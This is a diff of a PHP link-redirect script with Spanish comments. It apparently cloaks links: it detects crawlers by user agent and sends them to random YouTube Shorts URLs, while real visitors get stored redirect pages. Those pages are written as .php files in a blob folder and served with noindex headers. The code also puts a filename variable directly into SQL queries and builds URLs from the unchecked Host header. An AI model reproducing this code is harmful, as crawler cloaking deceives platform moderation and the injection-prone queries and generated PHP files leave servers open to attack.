@@ -34,16 +34,16 @@ foreach ($bots as $bot) {
         header("location: $short_urlx2", true, 200);
         die();
     }
-    else if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
-    {
-        $short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
-        header("location: $short_urlx2", true, 200);
-        die();
-    }    
+    //else if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
+ //   {
+    //    $short_urlx2 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
+        //header("location: $short_urlx2", true, 200);
+        //die();
+    //}    
     
 else {
 //--------------------------------Comprobar si existe el link en la base de datos-----------------------------//        
-$getx = $pdo->prepare("SELECT count(*) FROM storagex2 WHERE identify='$name_archivo_php'");
+$getx = $pdo->prepare("SELECT count(*) FROM storage WHERE identify='$name_archivo_php'");
 $getx->execute();
 $count = $getx->fetchColumn();
 
@@ -56,7 +56,7 @@ return;
 else{
    
 //------------------Selecciono parte de la  estructura de mi name_archivo.php---------------------------------//
-$sql = "SELECT username, redireccion, img, title, descripcion FROM storagex2 WHERE identify= '$name_archivo_php'";
+$sql = "SELECT username, redireccion, img, title, descripcion FROM storage WHERE identify= '$name_archivo_php'";
 $statement = $pdo->prepare($sql);
 $statement->execute();
 $permalinks = $statement->fetchAll(PDO::FETCH_ASSOC);
@@ -171,7 +171,7 @@ unlink("'.$name_archivo_php.'".".php")
 $contentHTMLEXTRAIDO = $contentHTML;
 //------------------------------Compruebo si mi name_archivo.php existe-----------------------------------//
 if (file_exists("blob" . "/" . $name_archivo_php.".php")) {
-$permalinkExiste = "https://cq0i.xyz/" . "blob" . "/" . $name_archivo_php.".php";
+$permalinkExiste =  "https://".$_SERVER["HTTP_HOST"]."/" . "blob" . "/" . $name_archivo_php.".php";
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
 header('X-Robots-Tag: noindex, nofollow');
@@ -184,7 +184,7 @@ die();
 //--------------Compruebo si mi name_archivo.php no existe para crearlo y visualizarlo--------------------//
 else {
 file_put_contents("blob" . "/" . $name_archivo_php.".php", $contentHTMLEXTRAIDO);
-$permalink = "https://cq0i.xyz/" . "blob" . "/" . $name_archivo_php.".php";
+$permalink = "https://".$_SERVER["HTTP_HOST"]. "/" ."blob" . "/" . $name_archivo_php.".php";
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
 header('X-Robots-Tag: noindex, nofollow');
